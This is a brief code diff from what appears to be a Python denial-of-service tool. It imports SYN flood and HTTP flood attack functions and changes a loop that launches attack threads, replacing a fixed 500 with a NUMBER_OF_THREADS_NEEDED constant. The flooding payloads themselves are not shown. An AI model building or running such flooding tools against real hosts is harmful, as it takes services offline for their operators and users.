@@ -5,7 +5,8 @@ from typing import Callable
 
 from SynFlood import synflood, conf_iface
 
-from utils.consts import HOSTNAME, HOST_IP, HOST_PORT, ATTACK_IP, ATTACK_PORT, MESSAGE, HTTP_FLOOD_REQUEST
+from utils.consts import HOSTNAME, HOST_IP, HOST_PORT, ATTACK_IP, ATTACK_PORT, MESSAGE, HTTP_FLOOD_REQUEST, \
+    NUMBER_OF_THREADS_NEEDED
 
 
 def syn_flood_attack() -> None:
@@ -33,7 +34,7 @@ def http_flood_attack() -> None:
 
 
 def create_multithreaded_attack(func: Callable) -> None:
-    for _ in range(500):
+    for _ in range(NUMBER_OF_THREADS_NEEDED):
         thread = Thread(target=func)
         thread.start()
 
